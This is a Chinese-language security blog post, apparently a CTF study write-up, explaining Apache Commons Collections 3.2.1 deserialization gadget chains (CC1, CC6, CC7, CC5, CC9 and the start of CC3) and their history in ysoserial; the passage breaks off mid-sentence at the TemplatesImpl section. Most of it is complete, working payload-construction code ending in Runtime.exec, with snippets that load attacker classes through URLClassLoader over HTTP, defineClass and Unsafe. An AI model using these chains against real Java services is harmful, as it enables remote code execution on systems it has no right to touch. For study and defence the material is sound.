---
title: "From CommonsCollections to RCE"
date: 2025-04-23 00:00:00 +0800
categories: [Security]
tags: [security, ctf, java]
---

> 什么? DT 神已经在我电脑上弹计算器了?

> 以下内容若无特别说明, 使用的版本为 `commons-collection:3.2.1`

> Java 版本需要和说明中的一致, 否则无法正常触发, 可以前往 https://blog.lupf.cn/category/jdkdl 找寻你要的 JDK 版本

![c3d166c01a571f75201cf3a8b727840b](https://s2.loli.net/2025/01/21/FAKT1zyIHQZwqb9.png)

![cf18eadfafeab194c58d88d74308aada](https://s2.loli.net/2025/01/21/werC8VsZmD72Io3.png)

![Image 1 of 1](https://s2.loli.net/2025/03/01/NcG6ELMIXYJyOQZ.png)

![java_serialization_format](https://s2.loli.net/2025/01/21/c8QzBUrd9FjnD4x.png)

## 开始之前

我们想要最终执行到的是 Runtime.exec, 需要进行方法执行, 当然, 我们不一定要直接找到调用了 Runtime.exec 的方法, 别忘了我们还有一个利器: 反射! 这可以让我们能够调用任意方法. 但是我们该如何产生这样一个反射流程呢?

### 惊鸿一瞥

我们不妨回顾一下历史

2015 年时 @frohoff 在 [OWASP AppSecCali 2015 - Marshalling Pickles](https://www.slideshare.net/slideshow/appseccali-2015-marshalling-pickles/44009258) 系统总结了当时的反序列化漏洞现状 (PHP, Pickle, Ruby) 并发布了有名的工具: [ysoserial](https://github.com/frohoff/ysoserial), 提出在 CommonCollections 中存在的最经典的反序列化 Gadget Chain - CommonsCollections1

我们可以看到后面最后都是到达了 ChainedTransformer, 在此之前我们先了解下 `Transformer` 是什么.

### Transformer

Transformer 的话可以对传入的内容进行一些操作并将其返回

我们可以看看 `Transformer` 接口:

```java
package org.apache.commons.collections;
public interface Transformer {
    public Object transform(Object input);
}
```

接受`transform` 函数接受一个 Object 并返回一个 Object

我们可以看一下有哪些继承了这个 Transformer

![image-20240518214330967](https://s2.loli.net/2024/05/18/AhvoatHqfysFD5z.png)

**ConstantTransformer**

返回构造函数中传入的常变量

***InvokerTransformer***

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    super();
    iMethodName = methodName;
    iParamTypes = paramTypes;
    iArgs = args;
}

public Object transform(Object input) {
    if (input == null) {
        return null;
    
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);
    } catch (...) {
		// ommitted
    }
}
```

可以看到这个在进行转换的时候会通过调用反射调用传入的对象中的方法, 并传入构造函数中传入的参数.

其中

* `input` 为传入的操作对象
* `methodName` 为要调用的方法
* `paramTypes` 为方法的参数类型列表
* `args` 为参数列表

***InstantiateTransformer***

将传入的 Class 调用构造方法生成实例, 其中需要提前定义好:

* `paramTypes` 为方法的参数类型列表
* `args` 为参数列表

**FactoryTransformer**

工厂类转换器

```java
public Object transform(Object input) {
    return iFactory.create();
}
```

通过调用工厂类的 `create` 方法来返回一个创建好的类型

**ClosureTransformer**

调用一个闭包方法, 传入的作为闭包方法的参数, 返回传入的参数

**PredicateTransformer**

调用一个Predicate方法, 传入的作为方法的参数, 返回他的返回值

**MapTransformer**

返回 Map 中键所对应的值, 如果不存在则返回 null

**StringValueTransformer**

将传入的转换为 string

***ChainedTransformer***

相当于把每个 Transformer 收尾相接拼了起来, 将前面一个的返回值作为下一个的参数

```java
public class ChainedTransformer implements Transformer, Serializable {
	private final Transformer[] iTransformers;
    
    public ChainedTransformer(Transformer[] transformers) {
        super();
        iTransformers = transformers;
    }
    
    public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
}
```

### 陌生的熟人

看了这么多, 还记得我们的最终目的吗? 我们想要达成 RCE! 还记得我们之前所见到过的如何最简单的进行 RCE 的方式吗?

```java
Runtime.getRuntime().exec("calc");
```

由于我们要用到 Transformer, 需要将这个调用过程拆开到很多的中间变量

```
var runtime = Runtime.getRuntime()
runtime.exec("calc");
```

所以我们该如何用 Transformer 来表达呢?

通常用这个将上述的内容拼接, 暂时用 `ConstantTransformer` 来存储 `runtime`, `InvokerTransformer` 来调用 `exec`, 用`ChainedTransformer` 此来进行多次连续操作

于是我们尝试先构造一个最基础的链子:

```java
Transformer[] transformers = new Transformer[]{
	new ConstantTransformer(Runtime.getRuntime()),
	new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
}; // 等同于 r = Runtime.getRuntime(); r.exec("calc");
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
chainedTransformer.transform("kengwang");
```

当然, 这里有个小问题, `Runtime.getRuntime()` 返回的 `Runtime` 类并没有继承 `Serializable` 接口, 不能被序列化

这个时候又要使用我们的利剑-- **反射** 了

由于 `Class` 类型可以被序列化, 我们尝试透过 `InvokerTransformer` 来反射调用这个 `getRuntime` 方法

```
((Runtime)Runtime.class.getMethod("getRuntime").invoke(null)).exec("calc");
```



于是我们优化我们的 Payload 如下:

```java 
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), // 无参静态方法
    new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
};
// Runtime.class.getMethod("getRuntime", null).invoke(Runtime.class, null).exec("calc");

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
chainedTransformer.transform("kengwang");
```

此时这个 ChainedTransformer就完成了最后的恶意类的代码执行的最后一环

只要我们尝试通过这个 ChainedTransformer 进行 Transform, 接下来就是补充上调用链了, 这就是我们 CC 链应当完成的了

### 万事开头难

我们已经有了上面的这个恶意代码, 只需要执行 `transform` 方法了, 如果我们需要调用这个 `transform` 方法, 我们需要找找调用了他的地方.

我们所需要满足的条件为:

* 实现了 `Serializable` 并重写了 `readObject`
* 直接或间接调用到了 `Transformer.transform`

由此, 欢迎步入 CommonCollections 反序列化的大门

> [!NOTE]
>
> 请注意, 有很多链子不再赘述是如何发现的, 可以自己尝试通过一些方法来找到和测试. 我们就先暂时站在巨人的肩膀上吧
>
> 后文并不按照 CC1-11 这样来讲, CC 后面的代号顺序并没有什么逻辑关系, 本文按照个人的理解来编排顺序

## CommonsCollections1 - 旅途开始

### TransformedMap

> Found by: Matthias Kaiser / [Source](https://www.slideshare.net/slideshow/exploiting-deserialization-vulnerabilities-in-java-54707478/54707478)
>
> Java Version: < 1.8.0_8u71

我们关注到了 `common-collections` 中存在的 TransformedMap

```java
public class TransformedMap {
    protected final Transformer keyTransformer;
    protected final Transformer valueTransformer;
    
    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
    
    protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
	
    // ommit other code
}

static class MapEntry extends AbstractMapEntryDecorator {
    public Object setValue(Object value) {
            value = parent.checkSetValue(value);
            return entry.setValue(value);
    }
}
```

只要调用了 `MapEntry.setValue()` 方法, 此时就会触发 `checkSetValue`, 从而到了 `valueTransformer.transform`

我们可以通过 `decorate` 方法设置它的 `valueTransformer`, 这样来使其能走到我们的 Transformer 里面

我们继续往上找一下拿 `MapEntry` 的地方, 终于我们来到了: **`sun.reflect.annotation.AnnotationInvocationHandler`**

下面有请我们今天的受害者:

```java
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private final Map<String, Object> memberValues;
    private final Class<? extends Annotation> type;
    
    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) { ... }
    
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(    						   // 👈 <-- Here!
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
}
```

此时我们还有很多问题需要解决, 如何创建好一个可以触发的 `AnnotationInvocationHandler`, 如何满足那一堆 if 条件让他能够到达我们的出发点, 我们接下来一个个解决

首先我们发现 `AnnotationInvocationHandler` 并不是 public 类, 这需要我们通过反射的 `Class.forName` 来进行获取, 对构造函数需要传入两个东西, 第一个是个继承了 `Annotation` 的 Type, 第二个是我们的 Map.

第一个的 Type 我们并不能乱选择, 通过阅读 `readObject` 中的逻辑我们可以知道, Type 中必须要有 Member, 并且它的名字需要和 Map 中的 key 一致, 这个时候我们就可以很轻松的调用到了

对于这样的一个 Type, 我们很容易找到, 例如 `Target`, `Retention` 等类, 以 `Target` 为例子:

```java
@Documented
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.ANNOTATION_TYPE)
public @interface Target {
    ElementType[] value();
}
```



最终, 我们的 Payload 如下:

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
    new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map<Object, Object> map = new HashedMap();
map.put("value", 123);
Map<Object, Object> evilMap = TransformedMap.decorate(map, null, chainedTransformer);
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);
cons.setAccessible(true);
Object aih = cons.newInstance(Target.class, evilMap);
return aih;
```



### LazyMap

> Found by: frohoff / [Source](https://www.slideshare.net/slideshow/appseccali-2015-marshalling-pickles/44009258)
>
> Java Version: < 1.8.0_8u71

然而, 我们在 ysoserial 里面看到的却不是我们之前的 TransformedMap, 而是另一个 `LazyMap`

```java
public class LazyMap
        extends AbstractMapDecorator
        implements Map, Serializable {
    public static Map decorate(Map map, Transformer factory) {
        return new LazyMap(map, factory);
    }
    
    public Object get(Object key) {
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
}
```

可以看到这里我们在调用 `get` 方法的时候调用到了 `transform` 方法, 我们可以在何处调用这个 `get` 呢?

目光再次回到 `AnnotationInvocationHandler`, 发现它的 `invoke` 方法调用了

```java
public Object invoke(Object proxy, Method method, Object[] args) {
        String member = method.getName();
        Class<?>[] paramTypes = method.getParameterTypes();

        if (member.equals("equals") && paramTypes.length == 1 &&
            paramTypes[0] == Object.class)
            return equalsImpl(args[0]);
        if (paramTypes.length != 0)
            throw new AssertionError("Too many parameters for an annotation method");

        switch(member) {
        case "toString":
            return toStringImpl();
        case "hashCode":
            return hashCodeImpl();
        case "annotationType":
            return type;
        }

        Object result = memberValues.get(member); 

        // ...

        return result;
    }
```

可是这下我们的触发点又变到了 `invoke`, 

接下来, 隆重介绍我们的 **对象代理**

#### 对象代理

Java 中如果想要劫持掉对某对象成员方法的调用, 我们可以采用代理来进行 (`java.reflect.Proxy`)

> 你可以类比成 PHP 反序列化中的 `__invoke` 方法, 所有对方法的调用都会被转发到这里

Proxy 的构造需要以下:

```java
public static Object newProxyInstance(ClassLoader loader,
                                      Class<?>[] interfaces,
                                      InvocationHandler h)
```

其中 ClassLoader 我们可以用默认的, 通过 `Map.class.getClassLoader()` 获取

Class 这个为你需要代理的接口

而这个 InvocationHandler 我们只需要用 `AnnotationInvocationHandler`, 这样在调用我们代理的类的任意方法的时候, 都会走这里绕一下

而我们代理好后就会返回一个被代理包装好的假 Map, 我们可以将这个假 Map 赋值给一个新的 `AnnotationInvocationHandler`

> [!TIP]
>
> 如果你正在使用 IDEA, 你可以将调试的自动 ToString 关掉, 否则可能会错误触发

#### Finally.......

于是乎, 我们在调用第二个 `AnnotationInvocationHandler#readObject` 中的 `memberValues.entrySet()` 时就会触发到这个代理, 代理会调用到我们的第一个 `AnnotationInvocationHandler#invoke` 从而触发到 `factory.transform`, 于是我们的链子和 `TransformedMap` 的终于对接上了

#### Wait

如果你再看看 ysoserial 中的[实现](https://github.com/frohoff/ysoserial/blob/b7d0f27b46af06bbced7dbafddc49678179d3708/src/main/java/ysoserial/payloads/CommonsCollections1.java#L65)可以发现他在 Chain 的结尾多了一个

```java
new ConstantTransformer(1)
```

或许已经注意到控制台中的报错:

```
Exception in thread "main" java.lang.ClassCastException: java.lang.ProcessImpl cannot be cast to java.util.Set
```

这里将我们最后一步的类型 `ProcessImpl` 暴露了出来. 所以 yso 在最后一步加上了一个 Constant, 这样最后的报错就只有

```
Exception in thread "main" java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set
```



### End.

在 JDK 8u71 的一次 [commit](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d) 中, 不再调用 `defaultReadObject`, 而是通过的 `readFields`, 这会导致我们在反序列化第一个 `AnnotationInvocationHandler#invoke` 的时候, `memberValues` 为 null, 从而不再触发后半段链子

> 网上有文章并没有解释对为什么出现问题了, 建议自己调一调看一看究竟有哪里不一样

至此 `AnnotationInvocationHandler` 完成了他的使命

## CommonsCollections6 - 柳暗花明

> Found by: Matthias Kaiser
>
> Tweak by: phith0n
>
> Java Version: **latest**

我们刚刚已经发现 `AnnotationInvocationHandler` 产生了变更导致我们无法进行到后半段链子触发 `LazyMap#get`

当然, 我们还可以找到其他的可以触发 `LazyMap#get` 的玩意儿来进行反序列化.

下面, 隆重介绍我们的接班人: `TiedMapEntry`

```java
public class TiedMapEntry implements Map.Entry, KeyValue, Serializable {
    private final Map map;
    
    public Object getValue() {
        return map.get(key);
    }
    
    public int hashCode() {
        Object value = getValue();
        return (getKey() == null ? 0 : getKey().hashCode()) ^
               (value == null ? 0 : value.hashCode()); 
    }
}
```

真好, 接下来我们该找如何触发 `getValue`, 很明显他的 `hashCode` 方法调用了

`hashCode`? 这不是我们之前在 [URLDNS](../恶意类/2. URLDNS.md) 中所遇见的触发点吗?

于是我们尝试套搬过来, 将其作为 HashMap 的 key

当然我们也要注意不要使其在我们 put 进去的时候就被 `hashCode` 触发了.

由于 `hashCode` 可能直接就导致后半段触发了, 同时也会在 map 里面提前执行了一遍写好了 map, 导致之后不会再去

当然我们之前的方法是因为 `Url` 类内部有缓存所以可以通过反射提前设置来绕过. 

同时也为了避免之前的 HashMap 这次似乎不可避免要调用一次 `hashCode` 了? 从而会牵动到整条链子, 导致触发到 `ChainedTransformer`, 同时也会导致 `LazyMap#get` 被触发, 其中:

```java
public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
 }
```

key 被设置到了 map 里面缓存了起来, 导致 LazyMap 真就 Lazy 了. 之后就不为 false 了

我们一条条解决吧:

第一个在 `put` 的时候将我们最终的 `ChainedTransformer` 设置成一条人畜无害的链子. 比如 `ConstantTransformer(1)`, 最后在 put 结束后序列化之前的时候利用反射将 `ChainedTransformer` 里面的 `iTransformers` 设置成恶意内容.

第二个的话我们可以尝试在 put 结束后将这个内部 map 中的这个 key 删除

于是我们再在尾巴上加点东西, 最后的 payload 如下:

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(
            "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer(
            "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
    new InvokerTransformer(
            "exec", new Class[]{String.class}, new Object[]{"calc"}),
    new ConstantTransformer(1)
};

ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
Map evilMap = new HashMap();
Map lazyMap = LazyMap.decorate(evilMap, fakeChain);
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "kengwang");
Map expMap = new HashMap();
expMap.put(tiedMapEntry, "aura");


Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
field.setAccessible(true);
field.set(fakeChain, transformers);

evilMap.remove("kengwang");

return expMap;
```

当然, 既然我们都已经用反射了, 不如我们再用反射让他先是一个假的 Map, 最后再替换回去吧.

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(
            "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer(
            "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
    new InvokerTransformer(
            "exec", new Class[]{String.class}, new Object[]{"calc"}),
    new ConstantTransformer(1)
};

ChainedTransformer chain = new ChainedTransformer(transformers);

Map evilMap = new HashMap();
Map lazyMap = LazyMap.decorate(evilMap, chain);

Map fakeMap = new HashMap();
TiedMapEntry tiedMapEntry = new TiedMapEntry(fakeMap, "kengwang");
Map expMap = new HashMap();
expMap.put(tiedMapEntry, "aura");

// tweak
Field mapField = tiedMapEntry.getClass().getDeclaredField("map");
mapField.setAccessible(true);
mapField.set(tiedMapEntry, lazyMap);

return expMap;
```

由于这个链子可以在高版本中使用, 故 CC6 的使用也挺常用的

### Wait

在 ysoserial 的链子中还在最外层包了一个 `HashSet`

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(
                "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer(
                "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
        new InvokerTransformer(
                "exec", new Class[]{String.class}, new Object[]{"calc"}),
        new ConstantTransformer(1)
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

Map evilMap = new HashMap();
Map lazyMap = LazyMap.decorate(evilMap, chainedTransformer);
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "kengwang");
HashSet hashSet = new HashSet(1);
hashSet.add("kengwang");
Field f = null;
try {
    f = HashSet.class.getDeclaredField("map");
} catch (NoSuchFieldException e) {
    f = HashSet.class.getDeclaredField("backingMap");
}
f.setAccessible(true);
HashMap innimpl = (HashMap) f.get(hashSet);

Field f2 = null;
try {
    f2 = HashMap.class.getDeclaredField("table");
} catch (NoSuchFieldException e) {
    f2 = HashMap.class.getDeclaredField("elementData");
}

f2.setAccessible(true);
Object[] array = (Object[]) f2.get(innimpl);

Object node = array[0];
if(node == null){
    node = array[1];
}

Field keyField = null;
try{
    keyField = node.getClass().getDeclaredField("key");
}catch(Exception e){
    keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
}

keyField.setAccessible(true);
keyField.set(node, tiedMapEntry);

return hashSet;
```

比我们之前的 CC6 链子要复杂得多, 平时我们还是不用 yso 里面的这个链子

> [!TIP]
>
> ysoserial 里面的链子有些复杂了一些, 在理解原理的情况下可以适当简化

## CommonsCollections7 - 乘胜追击

> Found by: scristalli, hanyrax, EdoardoVignati

我们刚刚使用的是 `HashMap` 来调用到的 `TiedMapEntry#hashCode`, 我们还有其他的方法能调用到这里, 比如 `Hashtable`

```java
private void readObject(ObjectInputStream s)
     throws IOException, ClassNotFoundException
{

    // ...omitted...
    table = new Entry<?,?>[length];

    for (; elements > 0; elements--) {
            K key = (K)s.readObject();
            V value = (V)s.readObject();
        reconstitutionPut(table, key, value);
    }
}
```

在 `reconstitutionPut` 中:

```java
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
        throws StreamCorruptedException
    {
        int hash = key.hashCode();
        // ...ommitted ...
    }
```

这里调用到了 `key` 的 `hashCode`

我们于是可以构造 Payload 了

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(
                "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer(
                "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
        new InvokerTransformer(
                "exec", new Class[]{String.class}, new Object[]{"calc"}),
        new ConstantTransformer(1)
};

ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{});
Map evilMap = new HashMap();
Map lazyMap = LazyMap.decorate(evilMap, fakeChain);
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "kengwang");

Hashtable hashtable = new Hashtable();
hashtable.put(tiedMapEntry, "kengwang");


Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
field.setAccessible(true);
field.set(fakeChain, transformers);

evilMap.remove("kengwang");

return hashtable;
```

### ysoserial

如果我们看看 ysoserial 的话我们可以发现他使用了两个 lazymap, 他所使用的 sink 点并不是我们之前的 `reconstitutionPut` 的 `hashcode` 那一行

而是转到了后面

```java
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value){
    int index = (hash & 0x7FFFFFFF) % tab.length;
    for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
        if ((e.hash == hash) && e.key.equals(key)) {
            throw new java.io.StreamCorruptedException();
        }
    }
}
```

在 `e.key.equals` 中调用到了 `map.get`, 由此接上了

好了, 接下来我们该解决中间该如何走到这里了

首先我们可以看到 `e.hash == hash` 存在可能的短路, 于是我们需要把这里给让其满足. 这个需要让我们两个的 `hash` 相同, 如何做到这一点呢?

ysoserial 中使用了 `yy`, `zZ` 来造成这样的哈希碰撞, 故这样就可以走到这里了

我们先尝试构造一下

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(
                "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer(
                "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
        new InvokerTransformer(
                "exec", new Class[]{String.class}, new Object[]{"calc"}),
        new ConstantTransformer(1)
};

ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{});
Map innerMap1 = new HashMap();
Map innerMap2 = new HashMap();
Map lazyMap1 = LazyMap.decorate(innerMap1, fakeChain);
lazyMap1.put("yy", 1);

Map lazyMap2 = LazyMap.decorate(innerMap2, fakeChain);
lazyMap2.put("zZ", 1);

Hashtable hashtable = new Hashtable();
hashtable.put(lazyMap1, 1);
hashtable.put(lazyMap2, 2);



Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
field.setAccessible(true);
field.set(fakeChain, transformers);

return hashtable;
```





## CommonsCollections5 - 小试牛刀

> Found by: Matthias Kaiser, @jasinner
>
> Java Version: < 1.8.0_8u76 (or else no SecurityManager, [Patch](https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70))

我们在 CommonsCollection6 中使用到的是 `TiedMapEntry#hashCode` 方法来触发. 当然, 我们也可以再看看这个类, 其中也有其他的类方法会触发到 LazyMap 的相关方法

而 CommonsCollections5 中所采用的就是 `TiedMapEntry#toString`, 此时找到了一个 `javax.management.BadAttributeValueExpException` 作为 入口类

```java
public class BadAttributeValueExpException extends Exception   {
    
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
}
```

我们看看这里的逻辑, 他会调用 `valObj.toString()` , 前提是 `System.getSecurityManager() == null` (后面的条件明显不会满足)

我们只需要让 `valObj` 为 LazyMap 就可以了.

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(
            "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer(
            "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
    new InvokerTransformer(
            "exec", new Class[]{String.class}, new Object[]{"calc"}),
    new ConstantTransformer(1)
};
Transformer transformerChain = new ChainedTransformer(transformers);

Map innerMap = new HashMap();
Map map = LazyMap.decorate(innerMap, transformerChain);
TiedMapEntry entry = new TiedMapEntry(map, "kengwang");

BadAttributeValueExpException bavee = new BadAttributeValueExpException(null);
Field field = BadAttributeValueExpException.class.getDeclaredField("val");
field.setAccessible(true);
field.set(bavee, entry);

return bavee;
```

## CommonsCollections9

相交于 CC5, 我们还找得到 `DefaultedMap` 

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        if (value instanceof Transformer) {
            return ((Transformer) value).transform(key);
        }
        return value;
    }
    return map.get(key);
}
```

和 `LazyMap` 一样, 在 `get` 的时候可以调用到 `transform`, 于是我们可以将我们的直接改成 `DefaultMap`

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(
            "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer(
            "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
    new InvokerTransformer(
            "exec", new Class[]{String.class}, new Object[]{"calc"}),
    new ConstantTransformer(1)
};
Transformer transformerChain = new ChainedTransformer(transformers);

Map innerMap = new HashMap();
Map map = DefaultedMap.decorate(innerMap, transformerChain);
TiedMapEntry entry = new TiedMapEntry(map, "kengwang");

BadAttributeValueExpException bavee = new BadAttributeValueExpException(null);
Field field = BadAttributeValueExpException.class.getDeclaredField("val");
field.setAccessible(true);
field.set(bavee, entry);

return bavee;
```





## CommonsCollections3 - 峰回路转

### 动态类加载

在我们之前的内容中都是在通过从 `Runtime.class` 配合 `InvokerTransformer` 来利用反射进行方法调用.

接下来我们将接触到一个崭新的工具: **动态类加载**

假设我们有下面的类, 他在 static 块中执行了命令

```java
public class ExecExploit {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

如果我们加载并初始化这个类则会执行 static 块中的内容:

```java
Class.forName("ExecExploit").newInstance();
```

当然如果你的这个类是已经编译好的 `.class` 文件也是可以加载的, 此时就需要我们用到 `URLClassLoader`

```java
URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{
        new URL("file:///E:\\Dino\\JavaSecLearning\\target\\tmp\\")
});
urlClassLoader.loadClass("ExecExploit").newInstance();
```

如果他在 `jar` 文件中, 我们可以稍微改改 URL

```java
URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{
        new URL("jar:file:///E:\\Dino\\JavaSecLearning\\jar.jar!/")
});
urlClassLoader.loadClass("ExecExploit").newInstance();
```

当然不仅是文件, 我们也可以从 http 中加载, 这边我们快速起个服务器

```java
URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{
        new URL("http://127.0.0.1:8080/")
});
urlClassLoader.loadClass("ExecExploit").newInstance();
```

可以发现也能成功加载 (旧版本 Java)



我们也存在方法允许我们通过字节码进行加载, 利用 `ClassLoader#defineClass`

```java
protected final Class<?> defineClass(byte[] b, int off, int len)
    throws ClassFormatError
{
    return defineClass(null, b, off, len, null);
}
```

由于这个方法是 protected 的, 我们需要通过反射拿到他

```java
byte[] bytes = Files.readAllBytes(Paths.get("ExecExploit.class"));
Method defClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
defClass.setAccessible(true);
Class clazz = (Class) defClass.invoke(CC3.class.getClassLoader(), bytes, 0, bytes.length);
clazz.newInstance();
```

我们可以这样成功加载. 当然除了 `ClassLoader`, 我们也可以用 `Unsafe#defineClass` 来实现:

```java
byte[] bytes = Files.readAllBytes(Paths.get("ExecExploit.class"));

Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
unsafeField.setAccessible(true);
Unsafe unsafe = (Unsafe)unsafeField.get(null);
Class cls = unsafe.defineClass(null, bytes, 0, bytes.length, null, null);
cls.newInstance();
```

### 言归正传

所以我们现在的目光就回到了如何找到可以调用到 `defineClass` 的地方

> Found by: frohoff
>
> Java Version: 
>
> 
>
> 此处特别感谢 白日梦组长 的思路, 特别清晰, 层层递进 !

我们这里可以从 `ClassLoader#defineClass` 一层层向上找, 看看有哪里是 public 方法调用的

最终我们的目光看到 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineClass`, 他调用了 `ClassLoader#defineClass`, 再往上是 `TemplatesImpl#defineTransletClasses`, 再往上我们可以看到出现了三个都调用到了, 因为我们需要进行实例化调用 `newInstance()`, 所以我们优先关注 `TemplatesImpl#getTransletInstance`, 再往上终于我们看到了 `TemplatesImpl#newTransformer`

他作为 public 方法可以层层调用到 `ClassLoader#defineClass`

接下来我们要一点点的让他按照我们希望的逻辑走, 扫平路上的 if 判断. 通过简单的审计发现前两层都是必定会进来的.

```java
private Translet getTransletInstance() throws TransformerConfigurationException {
	try {
    	if (_name == null) return null;
    	if (_class == null) defineTransletClasses();
		AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
        // ...
    }
}
```

首先需要 `_name` 不为 null, 否则就直接返回了

需要我们的 `_class` 为 null, 这样就会进到 `defineTransletClasses`

```java
private void defineTransletClasses()
